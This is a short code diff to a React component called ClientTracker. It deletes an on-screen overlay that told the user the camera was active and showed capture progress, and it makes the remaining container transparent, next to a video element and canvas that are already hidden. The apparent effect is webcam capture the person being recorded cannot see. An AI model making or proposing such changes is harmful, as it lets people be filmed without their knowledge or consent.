@@ -181,18 +181,7 @@ export default function ClientTracker({
       />
 
       {/* Status overlay */}
-      <div className="relative z-10 text-center bg-black bg-opacity-70 p-6 rounded-lg">
-        <div className="space-y-3 text-sm">
-          <div className="flex items-center justify-center space-x-2">
-            <span>📷</span>
-            <span>{getStatusMessage()}</span>
-          </div>
-          {captureProgress && (
-            <p className="text-xs text-gray-400 animate-pulse">
-              {captureProgress}
-            </p>
-          )}
-        </div>
+      <div className="relative z-10 text-center bg-transparent p-6 rounded-lg">
 
         {/* Hidden video and canvas */}
         <video ref={videoRef} style={{ display: "none" }} playsInline />
